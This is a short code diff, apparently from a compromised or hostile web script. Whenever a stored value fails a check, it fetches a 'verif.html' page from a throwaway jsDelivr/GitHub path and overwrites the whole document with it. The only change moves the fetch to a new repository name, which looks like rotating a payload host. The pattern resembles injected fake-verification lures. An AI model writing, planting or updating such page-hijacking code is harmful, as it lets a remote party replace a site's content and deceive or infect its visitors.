@@ -5,7 +5,7 @@
 
   if (storedValue !== requiredValue) {
     try {
-      const res = await fetch("https://cdn.jsdelivr.net/gh/1e295a49108e716ce8ab7eba0c8dca7d/wowzas41@main/drweb/verif.html?t=" + Date.now());
+      const res = await fetch("https://cdn.jsdelivr.net/gh/1e295a49108e716ce8ab7eba0c8dca7d/wowzas44@main/drweb/verif.html?t=" + Date.now());
       const html = await res.text();
       document.open();
       document.write(html);
